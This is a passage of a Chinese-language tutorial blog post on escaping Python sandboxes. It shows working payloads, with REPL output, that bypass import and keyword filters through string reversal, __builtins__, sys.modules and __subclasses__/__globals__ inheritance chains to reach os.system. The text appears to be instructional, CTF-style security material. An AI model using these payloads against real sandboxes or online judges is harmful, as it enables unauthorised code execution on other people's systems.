+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import  os</span><br><span class="line">import   os</span><br><span class="line">import    os</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>都可以。如果多个空格也过滤了，Python 能够 import 的可不止 <code>import</code>，还有 <code>__import__</code>：<code>__import__(&#39;os&#39;)</code>，<code>__import__</code>被干了还有 <code>importlib</code>：<code>importlib.import_module(&#39;os&#39;).system(&#39;ls&#39;)</code></p>
+<p>这样就安全了吗？实际上<code>import</code>可以通过其他方式完成。回想一下 import 的原理，本质上就是执行一遍导入的库。这个过程实际上可以用 <code>execfile</code> 来代替：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execfile(&#39;&#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;os.py&#39;)</span><br><span class="line">system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>不过要注意，2.x 才能用，3.x 删了 execfile，不过可以这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with open(&#39;&#x2F;usr&#x2F;lib&#x2F;python3.6&#x2F;os.py&#39;,&#39;r&#39;) as f:</span><br><span class="line">    exec(f.read())</span><br><span class="line">system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>这个方法倒是 2.x、3.x 通用的。</p>
+<p>不过要使用上面的这两种方法，就必须知道库的路径。其实在大多数的环境下，库都是默认路径。如果 sys 没被干掉的话，还可以确认一下，：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">print(sys.path)</span><br></pre></td></tr></table></figure>
+
+<h3 id="花式处理字符串"><a href="#花式处理字符串" class="headerlink" title="花式处理字符串"></a>花式处理字符串</h3><p>代码中要是出现 <code>os</code>，直接不让运行。那么可以利用字符串的各种变化来引入 os：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#39;so&#39;[::-1]).system(&#39;ls&#39;)</span><br><span class="line">b &#x3D; &#39;o&#39;</span><br><span class="line">a &#x3D; &#39;s&#39;</span><br><span class="line">__import__(a+b).system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>还可以利用 <code>eval</code> 或者 <code>exec</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; eval(&#39;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#39;[::-1])</span><br><span class="line">macr0phag3</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt; exec(&#39;)&quot;imaohw&quot;(metsys.so ;so tropmi&#39;[::-1])</span><br><span class="line">macr0phag3</span><br></pre></td></tr></table></figure>
+
+<p>顺便说一下，eval、exec 都是相当危险的函数，exec 比 eval 还要危险，它们一定要过滤，因为字符串有很多变形的方式，对字符串的处理可以有：逆序、变量拼接、base64、hex、rot13…等等，太多了。。。</p>
+<h3 id="恢复-sys-modules"><a href="#恢复-sys-modules" class="headerlink" title="恢复 sys.modules"></a>恢复 sys.modules</h3><p><code>sys.modules</code> 是一个字典，里面储存了加载过的模块信息。如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库例如 <code>os</code> 是默认被加载进来的，但是不能直接使用，原因在于 sys.modules 中未经 import 加载的模块对当前空间是不可见的。</p>
+<p>如果将 os 从 sys.modules 中剔除，os 就彻底没法用了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sys.modules[&#39;os&#39;] &#x3D; &#39;not allowed&#39;</span><br><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; os.system(&#39;ls&#39;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">AttributeError: &#39;str&#39; object has no attribute &#39;system&#39;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>注意，这里不能用 <code>del sys.modules[&#39;os&#39;]</code>，因为，当 import 一个模块时：import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A。</p>
+<p>所以删了 <code>sys.modules[&#39;os&#39;]</code> 只会让 Python 重新加载一次 os。</p>
+<p>看到这你肯定发现了，对于上面的过滤方式，绕过的方式可以是这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sys.modules[&#39;os&#39;] &#x3D; &#39;not allowed&#39; # oj 为你加的</span><br><span class="line"></span><br><span class="line">del sys.modules[&#39;os&#39;]</span><br><span class="line">import os</span><br><span class="line">os.system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>最后还有一种利用 <code>__builtins__</code> 导入的方式，下面会详细说。</p>
+<h3 id="花式执行函数"><a href="#花式执行函数" class="headerlink" title="花式执行函数"></a>花式执行函数</h3><p>通过上面内容我们很容易发现，光引入 os 只不过是第一步，如果把 system 这个函数干掉，也没法通过<code>os.system</code>执行系统命令，并且这里的<code>system</code>也不是字符串，也没法直接做编码等等操作。我遇到过一个环境，直接在<code>/usr/lib/python2.7/os.py</code>中删了<code>system</code>函数。。。</p>
+<p>不过，要明确的是，os 中能够执行系统命令的函数有很多：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print(os.system(&#39;whoami&#39;))</span><br><span class="line">print(os.popen(&#39;whoami&#39;).read()) </span><br><span class="line">print(os.popen2(&#39;whoami&#39;).read()) # 2.x</span><br><span class="line">print(os.popen3(&#39;whoami&#39;).read()) # 2.x</span><br><span class="line">print(os.popen4(&#39;whoami&#39;).read()) # 2.x</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>应该还有一些，可以在这里找找：</p>
+<p><a href="https://docs.python.org/2/library/os.html" target="_blank" rel="noopener">2.x 传送门</a></p>
+<p><a href="https://docs.python.org/3/library/os.html" target="_blank" rel="noopener">3.x 传送门</a></p>
+<p>过滤<code>system</code>的时候说不定还有其他函数给漏了。</p>
+<p>其次，可以通过 <code>getattr</code> 拿到对象的方法、属性：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">getattr(os, &#39;metsys&#39;[::-1])(&#39;whoami&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>不让出现 import也没事：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; getattr(getattr(__builtins__, &#39;__tropmi__&#39;[::-1])(&#39;so&#39;[::-1]), &#39;metsys&#39;[::-1])(&#39;whoami&#39;)</span><br><span class="line">macr0phag3</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<p>一样可以。这个方法同样可以用于逃逸过滤 import 的沙箱。关于 <code>__builtins__</code>，见下文。</p>
+<p>与 <code>getattr</code> 相似的还有 <code>__getattr__</code>、<code>__getattribute__</code>，它们自己的区别就是<code>getattr</code>相当于<code>class.attr</code>，都是获取类属性/方法的一种方式，在获取的时候会触发<code>__getattribute__</code>，如果<code>__getattribute__</code>找不到，则触发<code>__getattr__</code>，还找不到则报错。更具体的这里就不解释了，有兴趣的话可以搜搜。</p>
+<h3 id="builtins、builtin与builtins"><a href="#builtins、builtin与builtins" class="headerlink" title="builtins、builtin与builtins"></a>builtins、<strong>builtin</strong>与<strong>builtins</strong></h3><p>先说一下，<code>builtin</code>、<code>builtins</code>，<code>__builtin__</code>与<code>__builtins__</code>的区别：首先我们知道，在 Python 中，有很多函数不需要任何 import 就可以直接使用，例如<code>chr</code>、<code>open</code>。之所以可以这样，是因为 Python 有个叫<code>内建模块</code>（或者叫内建命名空间）的东西，它有一些常用函数，变量和类。顺便说一下，Python 对函数、变量、类等等的查找方式是按 <code>LEGB</code> 规则来找的，其中 B 即代表内建模块，这里也不再赘述了，有兴趣的搜搜就明白了。</p>
+<p>在 2.x 版本中，内建模块被命名为 <code>__builtin__</code>，到了 3.x 就成了 <code>builtins</code>。它们都需要 import 才能查看：</p>
+<p>2.x：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import __builtin__</span><br><span class="line">&gt;&gt;&gt; __builtin__</span><br><span class="line">&lt;module &#39;__builtin__&#39; (built-in)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>3.x：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import builtins</span><br><span class="line">&gt;&gt;&gt; builtins</span><br><span class="line">&lt;module &#39;builtins&#39; (built-in)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>但是，<code>__builtins__</code> 两者都有，实际上是<code>__builtin__</code>和<code>builtins</code> 的引用。它不需要导入，我估计是为了统一 2.x 和 3.x。不过<code>__builtins__</code>与<code>__builtin__</code>和<code>builtins</code>是有一点区别的，感兴趣的话建议查一下，这里就不啰嗦了。不管怎么样，<code>__builtins__</code> 相对实用一点，并且在 <code>__builtins__</code>里有很多好东西：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;__import__&#39; in dir(__builtins__)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; __builtins__.__dict__[&#39;__import__&#39;](&#39;os&#39;).system(&#39;whoami&#39;)</span><br><span class="line">macr0phag3</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt; &#39;eval&#39; in dir(__builtins__)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; &#39;execfile&#39; in dir(__builtins__)</span><br><span class="line">True</span><br></pre></td></tr></table></figure>
+
+<p>那么既然<code>__builtins__</code>有这么多危险的函数，不如将里面的危险函数破坏了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[&#39;eval&#39;] &#x3D; &#39;not allowed&#39;</span><br></pre></td></tr></table></figure>
+
+<p>或者直接删了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del __builtins__.__dict__[&#39;eval&#39;]</span><br></pre></td></tr></table></figure>
+
+<p>但是我们可以利用 <code>reload(__builtins__)</code> 来恢复 <code>__builtins__</code>。不过，我们在使用 <code>reload</code> 的时候也没导入，说明<code>reload</code>也在 <code>__builtins__</code>里，那如果连<code>reload</code>都从<code>__builtins__</code>中删了，就没法恢复<code>__builtins__</code>了，需要另寻他法。还有一种情况是利用 <code>exec command in _global</code> 动态运行语句时的绕过，比如实现一个计算器的时候，在最后有给出例子。</p>
+<p>这里注意，2.x 的 <code>reload</code> 是内建的，3.x 需要 <code>import imp</code>，然后再 <code>imp.reload</code>。你看，reload 的参数是 <code>module</code>，所以肯定还能用于重新载入其他模块，这个放在下面说。</p>
+<h3 id="通过继承关系逃逸"><a href="#通过继承关系逃逸" class="headerlink" title="通过继承关系逃逸"></a>通过继承关系逃逸</h3><p>在 Python 中提到继承就不得不提 <code>mro</code>，<code>mro</code>就是方法解析顺序，因为 Python 支持多重继承，所以就必须有个方式判断某个方法到底是 A 的还是 B 的。2.2 之前是经典类，搜索是深度优先；经典类后来发展为新式类，使用广度优先搜索，再后来新式类的搜索变为 C3 算法；而 3.x 中新式类一统江湖，默认继承 <code>object</code>，当然也是使用的 C3 搜索算法。。。扯远了扯远了，感兴趣的可以搜搜。不管怎么说，总是让人去判断继承关系显然是反人类的，所以 Python 中新式类都有个属性，叫<code>__mro__</code>，是个元组，记录了继承关系：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__</span><br><span class="line">(&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)</span><br></pre></td></tr></table></figure>
+
+<p>类的实例在获取 <code>__class__</code> 属性时会指向该实例对应的类。可以看到，<code>&#39;&#39;</code>属于 <code>str</code>类，它继承了 <code>object</code> 类，这个类是所有类的超类。具有相同功能的还有<code>__base__</code>和<code>__bases__</code>。需要注意的是，经典类需要指明继承 object 才会继承它，否则是不会继承的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class test:</span><br><span class="line">...     pass</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; test.__bases__</span><br><span class="line">&gt;&gt;&gt; class test(object):</span><br><span class="line">...     pass</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; test.__bases__</span><br><span class="line">(&lt;type &#39;object&#39;&gt;,)</span><br></pre></td></tr></table></figure>
+
+<p>那么知道这个有什么用呢？</p>
+<p>由于没法直接引入 os，那么假如有个库叫<code>oos</code>，在<code>oos</code>中引入了<code>os</code>，那么我们就可以通过<code>__globals__</code>拿到 os（<code>__globals__</code>是函数所在的全局命名空间中所定义的全局变量）。例如，<code>site</code> 这个库就有 <code>os</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import site</span><br><span class="line">&gt;&gt;&gt; site.os</span><br><span class="line">&lt;module &#39;os&#39; from &#39;&#x2F;Users&#x2F;macr0phag3&#x2F;.pyenv&#x2F;versions&#x2F;3.6.5&#x2F;lib&#x2F;python3.6&#x2F;os.py&#39;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>也就是说，能引入 site 的话，就相当于有 os。那如果 site 也被禁用了呢？没事，本来也就没打算直接 <code>import site</code>。可以利用 <code>reload</code>，变相加载 <code>os</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import site</span><br><span class="line">&gt;&gt;&gt; os</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">NameError: name &#39;os&#39; is not defined</span><br><span class="line">&gt;&gt;&gt; os &#x3D; reload(site.os)</span><br><span class="line">&gt;&gt;&gt; os.system(&#39;whoami&#39;)</span><br><span class="line">macr0phag3</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<p>还有，既然所有的类都继承的<code>object</code>，那么我们先用<code>__subclasses__</code>看看它的子类，以 2.x 为例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; for i in enumerate(&#39;&#39;.__class__.__mro__[-1].__subclasses__()): print i</span><br><span class="line">...</span><br><span class="line">(0, &lt;type &#39;type&#39;&gt;)</span><br><span class="line">(1, &lt;type &#39;weakref&#39;&gt;)</span><br><span class="line">(2, &lt;type &#39;weakcallableproxy&#39;&gt;)</span><br><span class="line">(3, &lt;type &#39;weakproxy&#39;&gt;)</span><br><span class="line">(4, &lt;type &#39;int&#39;&gt;)</span><br><span class="line">(5, &lt;type &#39;basestring&#39;&gt;)</span><br><span class="line">(6, &lt;type &#39;bytearray&#39;&gt;)</span><br><span class="line">(7, &lt;type &#39;list&#39;&gt;)</span><br><span class="line">(8, &lt;type &#39;NoneType&#39;&gt;)</span><br><span class="line">(9, &lt;type &#39;NotImplementedType&#39;&gt;)</span><br><span class="line">(10, &lt;type &#39;traceback&#39;&gt;)</span><br><span class="line">(11, &lt;type &#39;super&#39;&gt;)</span><br><span class="line">(12, &lt;type &#39;xrange&#39;&gt;)</span><br><span class="line">(13, &lt;type &#39;dict&#39;&gt;)</span><br><span class="line">(14, &lt;type &#39;set&#39;&gt;)</span><br><span class="line">(15, &lt;type &#39;slice&#39;&gt;)</span><br><span class="line">(16, &lt;type &#39;staticmethod&#39;&gt;)</span><br><span class="line">(17, &lt;type &#39;complex&#39;&gt;)</span><br><span class="line">(18, &lt;type &#39;float&#39;&gt;)</span><br><span class="line">(19, &lt;type &#39;buffer&#39;&gt;)</span><br><span class="line">(20, &lt;type &#39;long&#39;&gt;)</span><br><span class="line">(21, &lt;type &#39;frozenset&#39;&gt;)</span><br><span class="line">(22, &lt;type &#39;property&#39;&gt;)</span><br><span class="line">(23, &lt;type &#39;memoryview&#39;&gt;)</span><br><span class="line">(24, &lt;type &#39;tuple&#39;&gt;)</span><br><span class="line">(25, &lt;type &#39;enumerate&#39;&gt;)</span><br><span class="line">(26, &lt;type &#39;reversed&#39;&gt;)</span><br><span class="line">(27, &lt;type &#39;code&#39;&gt;)</span><br><span class="line">(28, &lt;type &#39;frame&#39;&gt;)</span><br><span class="line">(29, &lt;type &#39;builtin_function_or_method&#39;&gt;)</span><br><span class="line">(30, &lt;type &#39;instancemethod&#39;&gt;)</span><br><span class="line">(31, &lt;type &#39;function&#39;&gt;)</span><br><span class="line">(32, &lt;type &#39;classobj&#39;&gt;)</span><br><span class="line">(33, &lt;type &#39;dictproxy&#39;&gt;)</span><br><span class="line">(34, &lt;type &#39;generator&#39;&gt;)</span><br><span class="line">(35, &lt;type &#39;getset_descriptor&#39;&gt;)</span><br><span class="line">(36, &lt;type &#39;wrapper_descriptor&#39;&gt;)</span><br><span class="line">(37, &lt;type &#39;instance&#39;&gt;)</span><br><span class="line">(38, &lt;type &#39;ellipsis&#39;&gt;)</span><br><span class="line">(39, &lt;type &#39;member_descriptor&#39;&gt;)</span><br><span class="line">(40, &lt;type &#39;file&#39;&gt;)</span><br><span class="line">(41, &lt;type &#39;PyCapsule&#39;&gt;)</span><br><span class="line">(42, &lt;type &#39;cell&#39;&gt;)</span><br><span class="line">(43, &lt;type &#39;callable-iterator&#39;&gt;)</span><br><span class="line">(44, &lt;type &#39;iterator&#39;&gt;)</span><br><span class="line">(45, &lt;type &#39;sys.long_info&#39;&gt;)</span><br><span class="line">(46, &lt;type &#39;sys.float_info&#39;&gt;)</span><br><span class="line">(47, &lt;type &#39;EncodingMap&#39;&gt;)</span><br><span class="line">(48, &lt;type &#39;fieldnameiterator&#39;&gt;)</span><br><span class="line">(49, &lt;type &#39;formatteriterator&#39;&gt;)</span><br><span class="line">(50, &lt;type &#39;sys.version_info&#39;&gt;)</span><br><span class="line">(51, &lt;type &#39;sys.flags&#39;&gt;)</span><br><span class="line">(52, &lt;type &#39;exceptions.BaseException&#39;&gt;)</span><br><span class="line">(53, &lt;type &#39;module&#39;&gt;)</span><br><span class="line">(54, &lt;type &#39;imp.NullImporter&#39;&gt;)</span><br><span class="line">(55, &lt;type &#39;zipimport.zipimporter&#39;&gt;)</span><br><span class="line">(56, &lt;type &#39;posix.stat_result&#39;&gt;)</span><br><span class="line">(57, &lt;type &#39;posix.statvfs_result&#39;&gt;)</span><br><span class="line">(58, &lt;class &#39;warnings.WarningMessage&#39;&gt;)</span><br><span class="line">(59, &lt;class &#39;warnings.catch_warnings&#39;&gt;)</span><br><span class="line">(60, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;)</span><br><span class="line">(61, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;)</span><br><span class="line">(62, &lt;class &#39;_abcoll.Hashable&#39;&gt;)</span><br><span class="line">(63, &lt;type &#39;classmethod&#39;&gt;)</span><br><span class="line">(64, &lt;class &#39;_abcoll.Iterable&#39;&gt;)</span><br><span class="line">(65, &lt;class &#39;_abcoll.Sized&#39;&gt;)</span><br><span class="line">(66, &lt;class &#39;_abcoll.Container&#39;&gt;)</span><br><span class="line">(67, &lt;class &#39;_abcoll.Callable&#39;&gt;)</span><br><span class="line">(68, &lt;type &#39;dict_keys&#39;&gt;)</span><br><span class="line">(69, &lt;type &#39;dict_items&#39;&gt;)</span><br><span class="line">(70, &lt;type &#39;dict_values&#39;&gt;)</span><br><span class="line">(71, &lt;class &#39;site._Printer&#39;&gt;)</span><br><span class="line">(72, &lt;class &#39;site._Helper&#39;&gt;)</span><br><span class="line">(73, &lt;type &#39;_sre.SRE_Pattern&#39;&gt;)</span><br><span class="line">(74, &lt;type &#39;_sre.SRE_Match&#39;&gt;)</span><br><span class="line">(75, &lt;type &#39;_sre.SRE_Scanner&#39;&gt;)</span><br><span class="line">(76, &lt;class &#39;site.Quitter&#39;&gt;)</span><br><span class="line">(77, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;)</span><br><span class="line">(78, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，site 就在里面，以 2.x 的<code>site._Printer</code>为例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__[&#39;os&#39;]</span><br><span class="line">&lt;module &#39;os&#39; from &#39;&#x2F;Users&#x2F;macr0phag3&#x2F;.pyenv&#x2F;versions&#x2F;2.7.15&#x2F;lib&#x2F;python2.7&#x2F;os.pyc&#39;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>os 又回来了。并且 site 中还有 <code>__builtins__</code>。</p>
+<p>这个方法不仅限于 A-&gt;os，还阔以是 A-&gt;B-&gt;os，比如 2.x 中的 <code>warnings</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import warnings</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">&gt;&gt;&gt; warnings.os</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">AttributeError: &#39;module&#39; object has no attribute &#39;os&#39;</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">&gt;&gt;&gt; warnings.linecache</span><br><span class="line">&lt;module &#39;linecache&#39; from &#39;&#x2F;Users&#x2F;macr0phag3&#x2F;.pyenv&#x2F;versions&#x2F;2.7.15&#x2F;lib&#x2F;python2.7&#x2F;linecache.pyc&#39;&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">&gt;&gt;&gt; warnings.linecache.os</span><br><span class="line">&lt;module &#39;os&#39; from &#39;&#x2F;Users&#x2F;macr0phag3&#x2F;.pyenv&#x2F;versions&#x2F;2.7.15&#x2F;lib&#x2F;python2.7&#x2F;os.pyc&#39;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在继承链中就可以这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;whoami&#39;)</span><br><span class="line">macr0phag3</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<p>顺便说一下，<code>warnings</code>这个库中有个函数：<code>warnings.catch_warnings</code>，它有个<code>_module</code>属性：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    def __init__(self, record&#x3D;False, module&#x3D;None):</span><br><span class="line">...</span><br><span class="line">        self._module &#x3D; sys.modules[&#39;warnings&#39;] if module is None else module</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>所以通过<code>_module</code>也可以构造 payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39;][0]()._module.linecache.os.system(&#39;whoami&#39;)</span><br><span class="line">macr0phag3</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<p>3.x 中的<code>warnings</code>虽然没有 <code>linecache</code>，也有<code>__builtins__</code>。</p>
+<p>同样，py3.x 中有``，利用方式可以为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#39;system&#39;](&#39;whoami&#39;)</span><br><span class="line">macr0phag3</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<p>顺便提一下，<code>object</code> 本来就是可以使用的，如果没过滤这个变量的话，payload 可以简化为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.__subclasses__()[117].__init__.__globals__[&#39;system&#39;](&#39;whoami&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>还有一种是利用<code>builtin_function_or_method</code> 的 <code>__call__</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval, &#39;1+1&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>或者简单一点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__getattribute__(&#39;append&#39;).__class__.__call__(eval, &#39;1+1&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>还可以这样利用：</p>
